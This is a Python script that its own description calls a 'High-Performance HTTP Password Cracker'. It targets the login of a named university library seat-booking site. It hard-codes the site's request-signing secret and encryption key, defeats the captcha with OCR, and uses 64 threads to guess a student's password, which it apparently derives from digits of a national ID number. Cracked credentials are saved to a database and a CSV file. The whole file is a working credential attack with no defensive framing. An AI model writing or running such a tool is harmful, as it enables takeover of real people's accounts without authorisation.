# -*- coding: utf-8 -*-
import argparse
import base64
import concurrent.futures
import hashlib
import hmac
import logging
import queue
import sqlite3
import sys
import threading
import time
import uuid
from datetime import datetime

import ddddocr
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ================= Configuration & Constants =================
HMAC_SECRET = "ujnLIB2022tsg"
AES_KEY = "server_date_time"
AES_IV = "client_date_time"
DB_FILE = "crack.db"

BASE_URL = "https://seat.ujn.edu.cn"
LOGIN_API = f"{BASE_URL}/rest/auth"
CAPTCHA_API = f"{BASE_URL}/auth/createCaptcha"

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("HTTP_Cracker")

# Global control flags
stop_event = threading.Event()

# ocr_lock removed - using thread-local
progress_queue = queue.Queue()

# Thread-local storage for OCR engines
thread_local = threading.local()


def get_ocr_engine():
    """Get or create a thread-local OCR engine"""
    if not hasattr(thread_local, "engine"):
        # Initialize one engine per thread
        thread_local.engine = ddddocr.DdddOcr(show_ad=False, old=True)
    return thread_local.engine


# ================= Database Functions =================
def init_db():
    conn = sqlite3.connect(DB_FILE, timeout=30.0)
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS found_passwords (
        username TEXT PRIMARY KEY,
        password TEXT,
        found_at TIMESTAMP
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS crack_progress_detail (
        username TEXT,
        day_prefix TEXT,
        last_tried_password TEXT,
        updated_at TIMESTAMP,
        PRIMARY KEY (username, day_prefix)
    )
    """)
    conn.commit()
    return conn


def get_progress_map(conn, username):
    cursor = conn.cursor()
    cursor.execute(
        "SELECT day_prefix, last_tried_password FROM crack_progress_detail WHERE username = ?",
        (username,),
    )
    return {row[0]: row[1] for row in cursor.fetchall()}


def save_success(username, password):
    # Save to CSV
    try:
        # Check if already exists in CSV to avoid duplicates
        csv_path = "found_passwords.csv"
        already_exists = False
        try:
            with open(csv_path, "r", encoding="utf-8") as f:
                for line in f:
                    if line.startswith(f"{username},"):
                        already_exists = True
                        break
        except FileNotFoundError:
            pass

        if not already_exists:
            with open(csv_path, "a", encoding="utf-8") as f:
                f.write(f"{username},{password}\n")
    except Exception as e:
        logger.error(f"CSV Error saving success: {e}")

    # Save to DB
    try:
        with sqlite3.connect(DB_FILE, timeout=10.0) as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
            INSERT OR REPLACE INTO found_passwords (username, password, found_at)
            VALUES (?, ?, ?)
            """,
                (username, password, datetime.now().isoformat()),
            )
            conn.commit()
    except Exception as e:
        logger.error(f"DB Error saving success: {e}")


def db_updater_loop():
    """Background thread to batch update progress"""
    # Use a separate connection for this thread
    conn = sqlite3.connect(DB_FILE, timeout=30.0)
    cursor = conn.cursor()

    pending_updates = {}  # (username, day) -> password
    last_commit = time.time()

    while True:
        try:
            try:
                # Wait for items, but timeout quickly to check stop_event and commit interval
                item = progress_queue.get(timeout=0.5)
                username, day, password = item

                # High-water mark logic: only update if password is lexically larger
                # This prevents regression in progress if threads finish out of order
                key = (username, day)
                if key not in pending_updates or password > pending_updates[key]:
                    pending_updates[key] = password

            except queue.Empty:
                if stop_event.is_set():
                    break

            # Commit if batch is large enough or time has passed
            current_time = time.time()
            if len(pending_updates) > 0 and (
                len(pending_updates) > 50 or (current_time - last_commit > 2.0)
            ):
                try:
                    data = [
                        (u, d, p, datetime.now().isoformat())
                        for (u, d), p in pending_updates.items()
                    ]
                    cursor.executemany(
                        """
                        INSERT OR REPLACE INTO crack_progress_detail
                        (username, day_prefix, last_tried_password, updated_at)
                        VALUES (?, ?, ?, ?)
                        """,
                        data,
                    )
                    conn.commit()
                    logger.info(
                        f"Saved progress for {len(pending_updates)} items to DB."
                    )
                    pending_updates.clear()
                    last_commit = current_time
                except Exception as e:
                    logger.error(f"DB Batch Update Error: {e}")

        except Exception as e:
            logger.error(f"DB Updater Loop Error: {e}")
            time.sleep(1)

    # Final commit on exit
    if pending_updates:
        try:
            data = [
                (u, d, p, datetime.now().isoformat())
                for (u, d), p in pending_updates.items()
            ]
            cursor.executemany(
                """
                INSERT OR REPLACE INTO crack_progress_detail
                (username, day_prefix, last_tried_password, updated_at)
                VALUES (?, ?, ?, ?)
                """,
                data,
            )
            conn.commit()
            logger.info("Final progress save completed.")
        except Exception:
            pass
    conn.close()


# ================= Crypto & Helper Functions =================
def encrypt_aes(text):
    """AES-128-CBC encryption matching the frontend implementation"""
    key = AES_KEY.encode("utf-8")
    iv = AES_IV.encode("utf-8")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(text.encode("utf-8"), AES.block_size)
    encrypted = cipher.encrypt(padded)
    # Frontend appends '_encrypt' to the base64 string
    return base64.b64encode(encrypted).decode("utf-8") + "_encrypt"


def generate_headers(method="GET"):
    """Generate headers including the HMAC signature"""
    req_id = str(uuid.uuid4())
    req_date = str(int(time.time() * 1000))

    # Message format: seat::<UUID>::<Timestamp>::<Method>
    message = f"seat::{req_id}::{req_date}::{method}"

    signature = hmac.new(
        bytes(HMAC_SECRET, "utf-8"),
        msg=bytes(message, "utf-8"),
        digestmod=hashlib.sha256,
    ).hexdigest()

    return {
        "x-request-id": req_id,
        "x-request-date": req_date,
        "x-hmac-request-key": signature,
        "logintype": "PC",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }


def solve_captcha(sess):
    """
    Fetch and solve captcha.
    Returns (captchaId, answer_code) or (None, None) on failure.
    """
    try:
        # Fetch captcha image
        headers = {
            "User-Agent": "Mozilla/5.0",
        }
        resp = sess.get(CAPTCHA_API, headers=headers, timeout=5)
        if resp.status_code != 200:
            return None, None

        data = resp.json()
        captcha_id = data.get("captchaId")
        img_b64 = data.get("captchaImage")  # "data:image/png;base64,..."

        if not img_b64 or not captcha_id:
            return None, None

        # Strip prefix if present
        if "," in img_b64:
            img_b64 = img_b64.split(",")[1]

        img_bytes = base64.b64decode(img_b64)

        # Thread-local OCR
        engine = get_ocr_engine()
        code = engine.classification(img_bytes)

        return captcha_id, code

    except Exception as e:
        # logger.debug(f"Captcha error: {e}")
        return None, None


def check_login(sess, username, password):
    """
    Attempt a single login via HTTP.
    Returns:
      'SUCCESS': Login successful
      'FAIL_PASS': Password incorrect
      'FAIL_CAPTCHA': Captcha incorrect (should retry)
      'FAIL_LOCK': Account locked
      'ERROR': Network/Unknown error
    """
    try:
        # 1. Get Captcha
        cid, code = solve_captcha(sess)
        if not cid or not code:
            return "ERROR"

        # 2. Prepare headers with encryption
        headers = generate_headers("GET")
        headers["username"] = encrypt_aes(username)
        headers["password"] = encrypt_aes(password)

        # 3. Send Login Request
        # Note: Query params for captcha
        params = {"captchaId": cid, "answer": code}

        resp = sess.get(LOGIN_API, headers=headers, params=params, timeout=5)

        # 4. Analyze Response
        if resp.status_code == 200:
            data = resp.json()
            status = data.get("status")
            message = data.get("message", "")

            # Case: Success
            if status == "success" or "token" in data.get("data", {}):
                return "SUCCESS"

            # Case: Failure
            if "验证码" in message:
                return "FAIL_CAPTCHA"
            elif "密码" in message or "账号" in message:
                return "FAIL_PASS"
            elif "锁定" in message:
                return "FAIL_LOCK"
            else:
                # logger.warning(f"Unknown response: {message}")
                return (
                    "FAIL_PASS"  # Default to pass fail on unknown error to avoid stall
                )

        else:
            # logger.debug(f"HTTP Status {resp.status_code}")
            return "ERROR"

    except Exception as e:
        # logger.debug(f"Request exception: {e}")
        return "ERROR"

    return "ERROR"


# ================= Password Generator =================
def generate_passwords(gender="M", specific_day=None, progress_map=None):
    if progress_map is None:
        progress_map = {}

    days = [specific_day] if specific_day else [f"{d:02d}" for d in range(1, 32)]

    if gender.upper() == "ALL":
        target_genders = ["M", "F"]
    else:
        target_genders = [gender.upper()]

    for g in target_genders:
        target_remainder = 1 if g == "M" else 0

        for dd in days:
            # Key format: Gender_Day (e.g. M_30)
            day_key = f"{g}_{dd}"

            resume_pw = progress_map.get(day_key)

            # Try legacy key lookup (e.g. "30") if specific key not found
            if not resume_pw:
                legacy_pw = progress_map.get(dd)
                if legacy_pw:
                    try:
                        # Check if legacy password matches current gender
                        if int(legacy_pw[4]) % 2 == target_remainder:
                            resume_pw = legacy_pw
                            logger.info(
                                f"[*] Day {dd} ({g}): Found legacy progress {resume_pw}"
                            )
                    except (IndexError, ValueError):
                        pass

            skipping = False
            if resume_pw:
                skipping = True
                logger.info(f"[*] Day {day_key}: Resuming from {resume_pw}")

            for seq in range(1000):
                if seq % 2 != target_remainder:
                    continue

                sss = f"{seq:03d}"
                for check in range(10):
                    c = str(check)
                    password = f"{dd}{sss}{c}"

                    if skipping:
                        if password == resume_pw:
                            skipping = False
                        continue

                    yield password, day_key


# ================= Worker Function =================
def worker(username, password, day_prefix):
    """
    Thread worker to attempt one password.
    Loops internally for captcha retries.
    """
    if stop_event.is_set():
        return

    sess = requests.Session()

    # Retry loop for captcha/network errors
    max_retries = 10
    for i in range(max_retries):
        if stop_event.is_set():
            return

        result = check_login(sess, username, password)

        if result == "SUCCESS":
            logger.info(f"✅ FOUND PASSWORD: {password}")
            save_success(username, password)
            stop_event.set()
            return

        elif result == "FAIL_PASS":
            # Normal failure, queue progress update
            progress_queue.put((username, day_prefix, password))
            return

        elif result == "FAIL_CAPTCHA":
            # Retry immediately with same password
            continue

        elif result == "FAIL_LOCK":
            logger.critical("🚨 Account LOCKED. Stopping all threads.")
            stop_event.set()
            return

        elif result == "ERROR":
            # Network error, sleep briefly and retry
            time.sleep(0.5)
            continue


def main():
    parser = argparse.ArgumentParser(
        description="High-Performance HTTP Password Cracker"
    )
    parser.add_argument("username", help="Target Student ID")
    parser.add_argument(
        "--gender",
        "-g",
        choices=["M", "F", "ALL"],
        default="ALL",
        help="Gender (M/F/ALL)",
    )
    parser.add_argument("--day", "-d", help="Specific day (01-31)")

    parser.add_argument(
        "--threads", "-t", type=int, default=64, help="Number of threads (default: 64)"
    )

    args = parser.parse_args()

    # Init DB
    conn = init_db()

    # Check if password already exists
    cursor = conn.cursor()
    cursor.execute(
        "SELECT password FROM found_passwords WHERE username = ?", (args.username,)
    )
    found = cursor.fetchone()
    if found:
        logger.info(f"✅ Password already found in database: {found[0]}")
        save_success(args.username, found[0])
        conn.close()
        return

    progress = get_progress_map(conn, args.username)
    if progress:
        logger.info(f"[*] Resuming: Found progress for {len(progress)} days.")
    else:
        logger.info("[*] No saved progress found. Starting from scratch.")
    conn.close()

    # Start DB Updater Thread (non-daemon to ensure cleanup)
    db_thread = threading.Thread(target=db_updater_loop, daemon=False)
    db_thread.start()

    # Generate password list
    logger.info("Generating password list...")
    gen = generate_passwords(args.gender, args.day, progress)
    tasks = list(gen)
    total_tasks = len(tasks)

    if total_tasks == 0:
        logger.info("No passwords to test (Check filters or previous progress).")
        # Ensure DB thread closes if we return early
        stop_event.set()
        db_thread.join()
        return

    logger.info(
        f"[*] Target: {args.username} | Gender: {args.gender} | Tasks: {total_tasks}"
    )
    logger.info(f"[*] Threads: {args.threads} | Mode: Pure HTTP")

    start_time = time.time()

    # Executor
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)
    futures = []

    try:
        try:
            for pwd, day in tasks:
                if stop_event.is_set():
                    break
                future = executor.submit(worker, args.username, pwd, day)
                futures.append(future)
        except KeyboardInterrupt:
            logger.info("Stopping submission...")
            stop_event.set()

        # Monitor Loop
        completed = 0
        try:
            for _ in concurrent.futures.as_completed(futures):
                if stop_event.is_set():
                    break

                completed += 1
                if completed % 100 == 0:
                    elapsed = time.time() - start_time
                    speed = completed / elapsed if elapsed > 0 else 0
                    sys.stdout.write(
                        f"\r[*] Progress: {completed}/{total_tasks} | Speed: {speed:.1f} req/s"
                    )
                    sys.stdout.flush()
        except KeyboardInterrupt:
            logger.info("\nStopping...")
            stop_event.set()

    finally:
        if stop_event.is_set():
            executor.shutdown(wait=False, cancel_futures=True)
        else:
            executor.shutdown(wait=True)

    # Ensure DB thread finishes
    stop_event.set()
    logger.info("Waiting for database sync...")
    db_thread.join()

    print()  # Newline
    duration = time.time() - start_time
    logger.info(f"Finished in {duration:.2f} seconds.")


if __name__ == "__main__":
    main()
